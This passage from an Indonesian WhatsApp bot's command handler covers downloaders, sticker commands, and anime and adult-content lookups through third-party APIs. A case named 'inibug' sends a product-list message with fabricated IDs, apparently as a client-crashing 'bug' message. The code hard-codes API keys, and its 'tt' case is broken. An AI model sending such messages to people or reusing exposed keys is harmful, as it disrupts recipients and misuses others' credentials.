listmsg(from, `hai kak ${pushname} \n\nSilahkan pilih metode Donasi di bawah ya !`,`  `, list)
break
case 'inibug':
list = await kahfzz.prepareMessageFromContent(from, {
  "listMessage": {
 "title": "PAYMENT",
 "description": "CLICK",
 "buttonText": "",
 "listType": "PRODUCT_LIST",
 "productListInfo": {
"productSections": [
{
  "title": "LIST CATALOG",
  "products": [
  {
 "productId": "4120139628109348"
  },
  {
"productId": "6431678466857362"
 },
 {
"productId": "4392524570816732"
 }
 ]
  }
  ],
  "headerImage": {
"productId": "4120139628109348",
"jpegThumbnail": fakeimage
 },
 "businessOwnerJid": sender
  },
  "footerText": "MINAT? PC OWNER"
}
}, {quoted: freply})
kahfzz.relayWAMessage(list, {waitForAck: true})


break
case 'scan':
list = await kahfzz.prepareMessageFromContent(from, {
  "listMessage": {
 "title": "🛒 INFO BUSINIS ",
 "description": "LIST PRODUCT CLICK DI SINI ",
 "buttonText": "",
 "listType": "PRODUCT_LIST",
 "productListInfo": {
"productSections": [
{
  "title": "LIST HARGA",
  "products": [
  {
"productId": "4120139628109348"
 },
 {
"productId": "6431678466857362"
 },
 {
"productId": "4392524570816732"
 }
 ]
  }
  ],
  "headerImage": {
"productId": "4120139628109348",
"productId": "6431678466857362",
"productId": "4392524570816732",
"jpegThumbnail": fakeimage
 },
 "businessOwnerJid": sender
  },
  "footerText": "\nChat Owner Ngentod Kalo Mau buy. "
}
}, {quoted:kahfz})
kahfzz.relayWAMessage(list, {waitForAck: true})
break
//------------------< Sticker Cmd >-------------------
case 'addcmd': 
case 'setcmd':
if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
  if (isQuotedSticker) {
 if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
var kodenya = kahfz.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
 addCmd(kodenya, q)
 textImg("Done!")
  } else {
 reply('tag stickenya')
  }
  break
  case 'delcmd':
  if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
 if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
var kodenya = kahfz.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
 _scommand.splice(getCommandPosition(kodenya), 1)
 fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
 textImg("Done!")
 break
 case 'listcmd':
 let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
 let cemde = [];
 for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
 }
 mentions(teksnyee, cemde, true)
 break
//------------------< Downloader/Search/Anime >-------------------

case 'igdl': 
case 'instagram':
case 'instagramdownload':
if (!q) return reply('Link Yang Mana? ')
  if (!q.includes('instagram')) return reply(mess.error.Iv)
 reply(mess.wait)
  anu = await igDownloader(`${q}`)
  .then((data) => { sendMediaURL(from, data.result.link, data.result.desc, kahfz) })
  .catch((err) => { reply(String(err)) })
  break
  case 'scplay': 
  case 'soundcloud':
  if (!q) return reply('Link Yang Mana? ')
 if (!q.includes('soundcloud')) return reply(mess.error.Iv)
reply(mess.wait)
 anu = await fetchJson(`https://api.lolhuman.xyz/api/soundcloud?apikey=Mythia-Chan&url=${q}`)
 .then((data) => { sendMediaURL(from, data.result, kahfz) })
 .catch((err) => { reply(String(err)) })
 break
 case 'image':
 case 'gimage':
 case 'googleimage':
 if (args.length < 1) return reply('Apa Yang Mau Dicari?')
reply(mess.wait)
 teks = args.join(' ')
 res = await googleImage(teks, google)
 function google(error, result){
if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
  else {
 gugIm = result
 random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
 sendFileFromUrl(random, image, {quoted: freply, caption: `*Hasil Pencarian Dari :* ${teks}`})
  }
}
break
case 'ytmp3':
if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
  if (args.length < 1) return reply('Link Nya Mana?')
 if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
teks = args.join(' ')
 reply(mess.wait)
 res = await y2mateA(teks).catch(e => {
reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
 })
 result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
 ┆ *YOUTUBE MP3*
 └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

 *Data Berhasil Didapatkan!*
 \`\`\`🐥 Title : ${res[0].judul}\`\`\`
 \`\`\`🐥 Ext : MP3\`\`\`
 \`\`\`🐥 Size : ${res[0].size}\`\`\`

 _Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

 sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: freply}).then((lalu) => {
sendFileFromUrl(res[0].link, document, {quoted: freply, mimetype: 'audio/mp3', filename: res[0].output})
 })
 break
 case 'ytmp4':
 if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
if (args.length < 1) return reply('Link Nya Mana?')
  if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
 teks = args.join(' ')
  reply(mess.wait)
  res = await y2mateV(teks).catch(e => {
 reply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
  })
  result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
  ┆ *YOUTUBE MP4*
  └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

  *Data Berhasil Didapatkan!*
  \`\`\`🐥 Title : ${res[0].judul}\`\`\`
  \`\`\`🐥 Ext : MP4\`\`\`
  \`\`\`🐥 Size : ${res[0].size}\`\`\`

  _Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

  sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: freply}).then((lalu) => {
 sendFileFromUrl(res[0].link, video, {quoted: freply, mimetype: 'video/mp4', filename: res[0].output})
  })
  break
  case 'ytmp4hd':
  case 'ythd':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
 if (args.length === 0) return reply(`Kirim perintah */ytmp4 _linkYt_*`)
let isLinkks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
 if (!isLinkks2) return reply(mess.error.Iv)
try {
  reply(mess.wait)
  ythd(args[0])
  .then((res) => {
 const { dl_link, thumb, title, filesizeF, filesize } = res
 axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
 .then((a) => {
if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, 
  `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
  ┆ *YOUTUBE MP4*
  └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

  *Data Berhasil Didapatkan!*
  \`\`\`🐥 Title : ${title}\`\`\`
  \`\`\`🐥 Kualitas* : 720p\`\`\`
  \`\`\`🐥 Size* : ${filesizeF}\`\`\`
  \`\`\`🐥 Link* : ${a.data}\`\`\`

  _Untuk durasi lebih dari batas disajikan dalam Bentuk link_`)

  const captionsYtmp4 = 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`🐥 Title : ${title}\`\`\`
\`\`\`🐥 Kualitas : 720p\`\`\`
\`\`\`🐥 Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

sendMediaURL(from, thumb, captionsYtmp4)
sendMediaURL(from, dl_link,`nih kak`).catch(() => reply(mess.error.api))
 })		
  })
} catch (err) {
  reply(`eror`)
}
break
case 'google':
if (!q) return reply(mess.wrongFormat)
  ss = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=86951200d52c4e2eafa6b5a43a857939&url=http://google.com/search?q=${q}&oq={q}&aqs=chrome..69i57j0i433i512l2j0i512l2.858j0j4&client=ms-android-oppo&sourceid=chrome-mobile&ie=UTF-8`)
reply(mess.wait)
if(q == undefined || q == ' ') return reply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
  ggs({ 'query': q }).then(results => {
 vars = `_*Hasil Pencarian : ${q}*_\n`
 for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
 } 
 kahfzz.sendMessage(from, ss, image, {thumbnail: Buffer.alloc(0), caption: vars, quoted : kahfz})
  }).catch(e => {
console.log(e)
reply(`${e}`)
 })
  break
  case 'mediafire':
  case 'MediaFire':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
if (args.length < 1) return reply('Link Nya Mana? ')
  if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
 reply(mess.wait)
  teks = args.join(' ')
  res = await mediafireDl(teks)
  result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
  ┆ *MEDIAFIRE DOWNLOAD*
  └┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

  *Data Berhasil Didapatkan!*
  \`\`\`🐥 Nama : ${res[0].nama}\`\`\`
  \`\`\`🐤 Ukuran : ${res[0].size}\`\`\`
  \`\`\`🐣 Link : ${res[0].link}\`\`\`

  _*Tunggu Proses Upload Media......*_`
  reply(result)
  sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: freply})
  break
  case 'tt':
  if (!q) return reply('Linknya?')
if (!q.includes('tiktok')) return
  reply(mess.error.Iv)
reply(mess.wait)
anu = await TiktokDownloader(`${q}`)
kahfzyy ='hi.mp4'
kntl = 'hasil.mp4'
fs.writeFileSync(input,await getBuffer(data.result.watermark))
exec(`ffmpeg -i ${kahfzyy} -b:a 192K -vn  ${kntl}`,(err,res)=> {
  if (err) return reply(`${err}`)
 kahfzz.sendMessage(from,{url:'./'+kahfzyy},audio,{mimetype:'audio/mpeg'})
})

case 'ttdl':
case 'tiktokdl':
case 'tiktoknowm':
case 'tiktok':
if (!q) return reply('Linknya?')
  if (!q.includes('tiktok')) return reply(mess.error.Iv)
 data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=IkyChan&url=${q}`)
  result = `⚜️ *Nickname*: ${data.result.author.nickname}\n❤️ *Like*: ${data.result.statistic.diggCount}\n💬 *Komentar*: ${data.result.statistic.commentCount}\n🔁 *Share*: ${data.result.statistic.shareCount}\n🎞️ *Views*: ${data.result.statistic.playCount}\n?? *Desc*: ${data.result.title}`
  buttons = [{buttonId: `${prefix}tt1 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},{buttonId:`${prefix}ttaudio ${q}`,buttonText:{displayText:'🎵 Audio'},type:1}]
  fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(data.result.thumbnail))
  imageMsg = ( await kahfzz.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
  buttonsMessage = {footerText:'Pilih satu format di bawah ini', imageMessage: imageMsg,
  contentText:`${result}`,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  fs.unlinkSync(`./${sender}.jpeg`)
  break
  case 'tt1': 

  if (!q) return reply('Linknya?')
if (!q.includes('tiktok')) return reply(mess.error.Iv)
  reply(mess.wait)
anu = await TiktokDownloader(`${q}`)
.then((data) => { sendMediaURL(from, data.result.nowatermark) })
.catch((err) => { reply(String(err)) })
break

case 'xnxxsearch':
if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
 query = args.join(" ")
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=genbotkey&query=${query}`)
  get_result = get_result.result
  ini_txt = ""
  for (var x of get_result) {
 ini_txt += `Title : ${x.title}\n`
 ini_txt += `Views : ${x.views}\n`
 ini_txt += `Duration : ${x.duration}\n`
 ini_txt += `Uploader : ${x.uploader}\n`
 ini_txt += `Link : ${x.link}\n`
 ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
  }
  reply(ini_txt)
  break
  case 'xnxx':
  if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
 query = args.join(" ")
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=genbotkey&url=${query}`)
  get_result = get_result.result
  ini_txt = `Title : ${get_result.title}\n`
  ini_txt += `Duration : ${get_result.duration}\n`
  ini_txt += `View : ${get_result.view}\n`
  ini_txt += `Rating : ${get_result.rating}\n`
  ini_txt += `Like : ${get_result.like}\n`
  ini_txt += `Dislike : ${get_result.dislike}\n`
  ini_txt += `Comment : ${get_result.comment}\n`
  ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
  ini_txt += `Description : ${get_result.description}\n`
  ini_txt += "Link : \n"
  ini_link = get_result.link
  for (var x of ini_link) {
 ini_txt += `${x.type} - ${x.link}\n\n`
  }
  thumbnail = await getBuffer(get_result.thumbnail)
  await kahfzz.sendMessage(from, thumbnail, image, { quoted: freply , caption: ini_txt })
  break

  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://kahfzz-chan02.github.io`)
  
  case 'ttaudio': 
  case 'tiktokmusic': 
  case 'tiktokaudio':
  reply(mess.wait)
  anu = await fetchJson(`https://megayaa.herokuapp.com/api/tiktod/?url=${q}`)
  kahfzz.sendMessage(from, {url: anu.result.audio } , audio, { mimetype: Mimetype.mp4Audio, quoted: freply })
  case 'fbdl':
  case 'fb':
  case 'facebok':
  anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/facebook-dl?url=${q}&apikey=IkyOgiwara`)
  stringTime = new Date(`${anu.result.upload}`);
  stringTime2 = stringTime.getDate() + "/" + (stringTime.getMonth() + 1) + "/" + stringTime.getFullYear();
  teks = `「 RESULT FOUND 」\n\n• Title: ${anu.result.title}\n• Upload: ${stringTime2}\n• Like: ${convertToString(anu.result.reaction.like)}\n• Url: ${anu.result.link}`
  buff = await getBuffer(anu.result.thumb)
  kahfzz.sendMessage(from, buff, image, {quoted: freply, caption: teks})
  break
  case 'twitter':
  if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
if (!q) return reply('Linknya?')
  ten = args[0]
var res = await twitterGetUrl(`${ten}`)
.then(g => {
  ren = `${g.download[2].url}`
  sendMediaURL(from,ren,'Done')
})
break
case 'brainly':
reply(mess.wait)
brainly(args.join(" ")).then(res => {
  hmm = '────────────\n'
  for (let Y of res.data) {
 hmm += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`
  }
  reply(hmm)
  console.log(res)
})
break
case 'ssweb':
if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/`)
  reply(mess.wait)
ini_link = args[0]
ini_buffer = await getBuffer(`https://hardianto-chan.herokuapp.com/api/tools/ssweb?url=${ini_link}&apikey=hardianto`)
await kahfzz.sendMessage(from, ini_buffer, image, { quoted: freply })
break
case 'nhentaipdf':
if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
  if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)
 if (isNaN(Number(args[0]))) return await reply(mess.wrongFormat)
try {
  henid = args[0]
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=IkyChan`)
  get_result = get_result.result
  get_info = get_result.info
  teks = `*Doujinshi Downloader*

  📜 Title Romaji : ${get_result.title_romaji}
  📃 Title Native : ${get_result.title_native}
  🐤 Character : ${get_info.characters.join(", ")}\n`
  ini_image = await getBuffer(get_result.image[0])
  kahfzz.sendMessage(from, ini_image, image, { caption: teks, quoted: freply, thumbnail: fakeimage })
  reply(mess.wait)
  anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=IkyChan`)
  pdf = await getBuffer(anu.result)
  kahfzz.sendMessage(from, pdf, document, { quoted: freply, mimetype: Mimetype.pdf, filename: `${get_result.title_romaji}.pdf`, thumbnail: ini_image })
} catch (e) {
  console.log(e)
  reply(String(e))
}
break

case 'manga':
if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
 reply(mess.wait)
  query = args.join(" ")
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=IkyChan&query=${query}`)
  get_result = get_result.result
  ini_txt = `Id : ${get_result.id}\n`
  ini_txt += `Id MAL : ${get_result.idMal}\n`
  ini_txt += `Title : ${get_result.title.romaji}\n`
  ini_txt += `English : ${get_result.title.english}\n`
  ini_txt += `Native : ${get_result.title.native}\n`
  ini_txt += `Format : ${get_result.format}\n`
  ini_txt += `Chapters : ${get_result.chapters}\n`
  ini_txt += `Volume : ${get_result.volumes}\n`
  ini_txt += `Status : ${get_result.status}\n`
  ini_txt += `Source : ${get_result.source}\n`
  ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
  ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
  ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
  ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
  ini_txt += `Score : ${get_result.averageScore}%\n`
  ini_txt += `Characters : \n`
  ini_character = get_result.characters.nodes
  for (var x of ini_character) {
 ini_txt += `- ${x.name.full} (${x.name.native})\n`
  }
  ini_txt += `\nDescription : ${get_result.description}`
  buff = await getBuffer(get_result.coverImage.large)
  buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `Back To Menu`},type:1}]
  imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
  buttonsMessage = {footerText:'follow @kahfzz_ads', imageMessage: imageMsg,
  contentText: ini_txt,buttons,headerType:4}
  prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
  kahfzz.relayWAMessage(prep)
  break
  case 'doujindesu':
  if (!q) return reply(mess.wrongFormat)
reply(mess.wait)
 try {
doujinnya = await got.get(`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${q}&apiKey=administrator`).json()
let { data } = await doujinnya
xixixai = `*Doujindesu Search*\n`
for (let i = 0; i < data.length; i++) {
  xixixai += `\n*Urutan ${i+1}*\n*Title:* ${data[i].title}\n*Type:* ${data[i].type}\n*Status:* ${data[i].status}\n*Rating:* ${data[i].rating}\n*Followers:* ${data[i].followers}\n`
}
buffer = await getBuffer(data[0].thumb)
kahfzz.sendMessage(from, buffer, image, {caption: xixixai, quoted: freply})
 } catch (e) {
console.log(e)
reply(String(e))
 }
 break
 case 'anime':
 if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
reply(mess.wait)
 query = args.join(" ")
 get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=IkyChan&query=${query}`)
 get_result = get_result.result
 ini_txt = `Id : ${get_result.id}\n`
 ini_txt += `Id MAL : ${get_result.idMal}\n`
 ini_txt += `Title : ${get_result.title.romaji}\n`
 ini_txt += `English : ${get_result.title.english}\n`
 ini_txt += `Native : ${get_result.title.native}\n`
 ini_txt += `Format : ${get_result.format}\n`
 ini_txt += `Episodes : ${get_result.episodes}\n`
 ini_txt += `Duration : ${get_result.duration} mins.\n`
 ini_txt += `Status : ${get_result.status}\n`
 ini_txt += `Season : ${get_result.season}\n`
 ini_txt += `Season Year : ${get_result.seasonYear}\n`
 ini_txt += `Source : ${get_result.source}\n`
 ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
 ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
 ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
 ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
 ini_txt += `Score : ${get_result.averageScore}%\n`
 ini_txt += `Characters : \n`
 ini_character = get_result.characters.nodes
 for (var x of ini_character) {
ini_txt += `- ${x.name.full} (${x.name.native})\n`
 }
 ini_txt += `\nDescription : ${get_result.description}`
 thumbnail = await getBuffer(get_result.coverImage.large)
 await kahfzz.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })
 break
 case 'kusonime':
 if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
reply(mess.wait)
 query = args.join(" ")
 get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=Mythia-Chan&query=${query}`)
 get_result = get_result.result
 ini_txt = `Title : ${get_result.title}\n`
 ini_txt += `Japanese : ${get_result.japanese}\n`
 ini_txt += `Genre : ${get_result.genre}\n`
 ini_txt += `Seasons : ${get_result.seasons}\n`
 ini_txt += `Producers : ${get_result.producers}\n`
 ini_txt += `Type : ${get_result.type}\n`
 ini_txt += `Status : ${get_result.status}\n`
 ini_txt += `Total Episode : ${get_result.total_episode}\n`
 ini_txt += `Score : ${get_result.score}\n`
 ini_txt += `Duration : ${get_result.duration}\n`
 ini_txt += `Released On : ${get_result.released_on}\n`
 ini_txt += `Desc : ${get_result.desc}\n`
 link_dl = get_result.link_dl
 for (var x in link_dl) {
ini_txt += `\n${x}\n`
for (var y in link_dl[x]) {
  ini_txt += `${y} - ${link_dl[x][y]}\n`
}
 }
 ini_buffer = await getBuffer(get_result.thumbnail)
 await kahfzz.sendMessage(from, ini_buffer, image, { quoted: freply, caption: ini_txt })
 break
 case 'otakudesu':
 if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
  reply(mess.wait)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=Mythia-Chan&query=${query}`)
get_result = get_result.result
ini_txt = `Title : ${get_result.title}\n`
ini_txt += `Japanese : ${get_result.japanese}\n`
ini_txt += `Judul : ${get_result.judul}\n`
ini_txt += `Type : ${get_result.type}\n`
ini_txt += `Episode : ${get_result.episodes}\n`
ini_txt += `Aired : ${get_result.aired}\n`
ini_txt += `Producers : ${get_result.producers}\n`
ini_txt += `Genre : ${get_result.genres}\n`
ini_txt += `Duration : ${get_result.duration}\n`
ini_txt += `Studios : ${get_result.status}\n`
ini_txt += `Rating : ${get_result.rating}\n`
ini_txt += `Credit : ${get_result.credit}\n`
get_link = get_result.link_dl
for (var x in get_link) {
  ini_txt += `\n\n*${get_link[x].title}*\n`
  for (var y in get_link[x].link_dl) {
 ini_info = get_link[x].link_dl[y]
 ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
 ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
 ini_txt += `\`\`\`Link : \`\`\`\n`
 down_link = ini_info.link_dl
 for (var z in down_link) {
ini_txt += `${z} - ${down_link[z]}\n`
 }
  }
}
reply(ini_txt)
break
case 'nekopoi':
if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
  ini_url = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=Mythia-Chan&url=${ini_url}`)
get_result = get_result.result
ini_txt = `\`\`\`🐥 Title : ${get_result.anime}\`\`\`\n`
ini_txt += `\`\`\`🐥 Porducers : ${get_result.producers}\`\`\`\n`
ini_txt += `\`\`\`🐥 Duration : ${get_result.duration}\`\`\`\n`
ini_txt += `\`\`\`🐥 Size : ${get_result.size}\`\`\`\n`
ini_txt += `\`\`\`🐥 Sinopsis : ${get_result.sinopsis}\`\`\`\n`
link = get_result.link
for (var x in link) {
  ini_txt += `\n${link[x].name}\n`
  link_dl = link[x].link
  for (var y in link_dl) {
 ini_txt += `${y} - ${link_dl[y]}\n`
  }
}
buff = await getBuffer(get_result.thumb)

buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'follow @kahfzz_ads', imageMessage: imageMsg,
contentText: ini_txt,buttons,headerType:4}
prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
kahfzz.relayWAMessage(prep)
break
case 'nekopoisearch':
if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
  query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=IkyChan&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
  ini_txt += `\`\`\`🐥 Title : ${x.title}\`\`\`\n`
  ini_txt += `\`\`\`🐥 Link : ${x.link}\`\`\`\n`
  ini_txt += `\`\`\`🐥 Thumbnail : ${x.thumbnail}\`\`\`\n\n`
}
reply(ini_txt)
break
case 'neko':
case 'kanna':
case 'sagiri':
case 'megumin':
case 'wallnime':
reply(mess.wait)
buff = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=IkyChan`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'SubsCribe : KAHFZ BOT', imageMessage: imageMsg,
contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
kahfzz.relayWAMessage(prep)

break



break
case 'nakanoitsuki':
case 'nakanokahfzz':
case 'nakanomiku':
reply(mess.wait)
res = await axios.get(`https://fdciabdul.tech/api/pinterest?keyword=${command}`)
var string = JSON.parse(JSON.stringify(res.data))
var random =  string[Math.floor(Math.random() * string.length)]
sendFileFromUrl(random, image, {quoted: freply, thumbnail: Buffer.alloc(0), caption: `*Wangy²*`})
break
case 'storyanime':

reply(mess.wait)
anu = await fetchJson(`https://lolhuman.herokuapp.com/api/storynime?apikey=Mythia-Chan`)
buffer = await getBuffer(anu.result)
kahfzz.sendMessage(from, buffer, video, { quoted: freply })
break
case 'nekopoi3d':
case '3dnekopoi':
case '3dnekopoilast':
if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
  reply(mess.wait)
try {
  bsangee = await axios.get(`https://api.vhtear.com/neko3d&apikey=${setting.vhtearkey}`)
  bsangee2 = bsangee.data
  keluarplay = `*List update 3D JAV*\n`
  for (let i = 0; i < bsangee2.result.length; i++) {
 keluarplay += `\n═════════════════\n\n*Judul* : ${bsangee2.result[i].title}\n*Deskripsi* : ${bsangee2.result[i].description}\n*Link* : ${bsangee2.result[i].url}\n`
  }
  reply(keluarplay) 
} catch (err) {
  console.log(err)
  reply('error!')
}
break
case 'nekopoijav':
case 'javnekopoi':
if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
 reply(mess.wait)
  try {
 bsangce = await axios.get(`https://api.vhtear.com/nekojavlist&apikey=${setting.vhtearkey}`)
 bsangce2 = bsangce.data
 keluarplay = `*List update JAV*\n`
 for (let i = 0; i < bsangce2.result.length; i++) {
keluarplay += `\n═════════════════\n\n*Judul* : ${bsangce2.result[i].title}\n*Serial JAV* : ${bsangce2.result[i].seri}\n*Link* : ${bsangce2.result[i].url}\n`
 }
 reply(keluarplay)
  } catch (err) {
 console.log(err)
  }
  break
  case 'nekopoicosplay':
  case 'cosplaynekopoi':
  if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted: freply})
 try {
reply(mess.wait)
bsangbe = await axios.get(`https://api.vhtear.com/nekojavcosplay&apikey=${setting.vhtearkey}`)
bsangbe2 = bsangbe.data
keluarplay = `*List update Cosplay JAV*\n`
for (let i = 0; i < bsangbe2.result.length; i++) {
  keluarplay += `\n═════════════════\n\n*Judul* : ${bsangbe2.result[i].title}\n*Deskripsi* : ${bsangbe2.result[i].detail}\n*Link* : ${bsangbe2.result[i].url}\n`
}
reply(keluarplay)
 } catch (err) {
console.log(err)
 }
 break
 case 'otakuongoing':  
 o = await onGoing()
 console.log(o)
 ot = '*「 Ongoing Otakudesu 」*'
 for (let i = 0; i < o.length; i++) {
ot += `\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
 }
 buff = await getBuffer(o[0].thumb)
 buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
 imageMsg = (await kahfzz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
 buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
 contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
